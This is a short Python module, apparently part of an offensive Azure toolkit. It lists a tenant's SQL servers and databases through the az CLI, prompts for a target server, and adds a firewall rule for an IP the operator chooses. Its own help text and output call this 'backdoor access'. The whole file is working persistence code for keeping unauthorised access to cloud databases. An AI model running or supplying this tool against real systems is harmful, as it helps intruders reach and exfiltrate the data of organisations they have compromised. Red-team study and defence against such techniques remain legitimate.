import subprocess
import json
import pprint

def start(args):
	help_str = "usage:\n\texec sql_backdoor_firewall_rule ---> adds a firewall rule for an ip of your choosing for backdoor access"
	if(len(args)>0):
		if(args[0][0] == "?"):
			print(help_str)
			return
	
	print("[+] getting servers [+]")
	sql_info = subprocess.run(['az', 'sql', 'server', 'list', '--query', '[].{name:name, rgrp: resourceGroup} '], stdout=subprocess.PIPE)
	sql_info_json = json.loads(sql_info.stdout.decode('utf-8'))


	servers = []
	rgrps = []
	for info in sql_info_json:
		servers.append(info['name'])
		rgrps.append(info['rgrp'])

	print("[+] getting databases [+]")
	for i in range(len(servers)):
		sql_info = subprocess.run(['az', 'sql', 'db', 'list', '--server', servers[i], '--resource-group', rgrps[i], '--query', '[].{name:name}'], stdout=subprocess.PIPE)
		sql_info_json = json.loads(sql_info.stdout.decode('utf-8'))
		print("\n", servers[i], "\n")
		pprint.pprint(sql_info_json)


	server_choice = input("\nwhich server would you like to target: ")
	if(server_choice not in servers):
		print("[-] not a valid choice [-]")
		return

	index = servers.index(server_choice)
	print("[+] getting existing rule names [+]")

	rulenames = subprocess.run(['az', 'sql', 'server', 'firewall-rule', 'list', '--server', server_choice, '--resource-group', rgrps[index], '--query', '[].name'], stdout=subprocess.PIPE)
	rulenames_json = json.loads(rulenames.stdout.decode('utf-8'))
	pprint.pprint(rulenames_json)

	rule_name = input("\nenter name for rule: ")
	ip_choice = input("\nenter the IP address for the rule: ")

	add_rule = subprocess.run(['az', 'sql', 'server', 'firewall-rule', 'create', '--server', server_choice, '--resource-group', rgrps[index], '-n', rule_name, '--start-ip-address', ip_choice, '--end-ip-address', ip_choice], stdout=subprocess.PIPE)

	print("[+] added backdoor rule [+]")



	#server = sql_info_json['name']
	#rgroup = sql_info_json['rgrp']



	
	


